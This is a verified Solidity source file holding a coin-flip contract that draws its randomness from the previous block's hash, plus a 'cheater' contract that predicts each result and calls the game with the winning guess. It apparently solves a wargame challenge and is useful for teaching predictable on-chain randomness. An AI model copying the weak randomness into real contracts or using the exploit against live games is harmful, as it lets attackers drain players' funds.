/**
 *Submitted for verification at Etherscan.io on 2021-10-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number -1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract cheater{
 
 uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public flipper;
    
    constructor() public{
        flipper = CoinFlip(0xA9153827e8678F5965015e3A7F0Ed4CeF2628Eb8);
    }
    
  function cheat() public returns (bool){
    uint256 blockValue = uint256(blockhash(block.number -1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return flipper.flip(side);
  }
}